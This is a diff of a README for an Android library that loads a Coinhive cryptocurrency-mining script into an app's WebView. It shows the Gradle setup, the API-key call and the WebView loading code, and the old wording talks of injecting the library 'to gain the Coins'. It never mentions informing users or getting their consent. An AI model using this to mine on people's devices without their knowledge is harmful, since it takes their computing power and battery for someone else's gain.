@@ -1,36 +1,54 @@
-# coin-miner-android-library
-Android Lib you can integrate it with your application (inject) to gain the Coins
+# 🪙 Coin Miner Android Library
 
-- instalation
+Android library that lets you integrate a coin miner into your app.
+
+## Installation & Usage
+
+Add JitPack to your project-level `build.gradle`, then add the dependency to your app-level `build.gradle`:
+
+allprojects {
+    repositories {
+        maven { url 'https://jitpack.io' }
+    }
+}
+
+dependencies {
+    implementation 'com.github.alitarfa:coin-miner-android-library:0.0.1'
+}
+
+---
+
+Get your API key from https://coinhive.com and generate the mining script:
+
+String file = SettingFileCoinMiner.getFileSetting("YOUR_API_KEY");
+
+Add a WebView to your layout (for example in `activity_main.xml`):
+
+```xml
+<WebView
+    android:id="@+id/webView"
+    android:layout_width="wrap_content"
+    android:layout_height="wrap_content" />
 ```
-  allprojects {
-		repositories {
-			...
-			maven { url 'https://jitpack.io' }
-		}
-	}
+
+In your Activity:
+
+```java
+WebView wv = findViewById(R.id.webView);
+wv.getSettings().setJavaScriptEnabled(true);
+
+String file = SettingFileCoinMiner.getFileSetting("YOUR_API_KEY");
+String mime = "text/html";
+String encoding = "utf-8";
+
+wv.loadDataWithBaseURL(null, file, mime, encoding, null);
 ```
+---
 
-- dependencies 
+Add Internet permission to your `AndroidManifest.xml`:
 
-```
-compile 'com.github.alitarfa:coin-miner-android-library:0.0.1'
-```  
-- how yo use the library :
- - first make sure to have a API key visite the web site  :coinhive 
- - Use this method to set your API key getFileSetting(key_api);
-   this method return a string file you need to save it into attr string  
-          
- - you must insert WebView in the Activity with width and height wrap-content
- - in Activity java 
- ```
-      WebView wv=findViewById(R.id.webView);
-      wv.getSettings().setJavaScriptEnabled(true);      
-      String mime = "text/html";
-      String encoding = "utf-8";
-      Log.e("script",file);
-      webView.loadDataWithBaseURL(null, file, mime, encoding, null);
-```
+<uses-permission android:name="android.permission.INTERNET" />
 
-the file param is a string returned by the static method getFileSetting() from the class SettingFileCoinMiner
+---
 
+License: MIT © [Ali Tarfa](https://github.com/alitarfa)
